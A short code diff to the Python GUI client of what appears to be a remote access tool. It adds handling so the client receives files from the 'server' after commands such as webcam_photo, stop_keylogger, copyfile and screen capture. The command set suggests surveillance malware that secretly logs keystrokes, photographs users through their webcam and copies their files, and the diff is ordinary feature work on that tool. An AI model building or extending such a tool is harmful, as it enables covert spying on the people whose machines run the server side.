@@ -182,7 +182,12 @@ class NetworkClientGUI:
                 # Check if server is sending a file
                 last_command = getattr(self, 'last_command', '')
                 if (("Screenshot captured successfully" in response and last_command == "screenshot") or
-                    ("Screen recording stopped" in response and last_command == "stop_record")):
+                    ("Screen recording stopped" in response and last_command == "stop_record") or
+                    ("Webcam photo captured successfully" in response and last_command == "webcam_photo") or
+                    ("Keylogger stopped" in response and last_command == "stop_keylogger") or
+                    ("File copied successfully" in response and last_command.startswith("copyfile")) or
+                    ("process_list.txt" in response and last_command == "list_services") or
+                    ("list_apps.txt" in response and last_command == "list_apps")):
                     self.output_box.insert(tk.END, "Waiting to receive file from server...\n")
                     self.output_box.see(tk.END)
                     if self.receive_file():
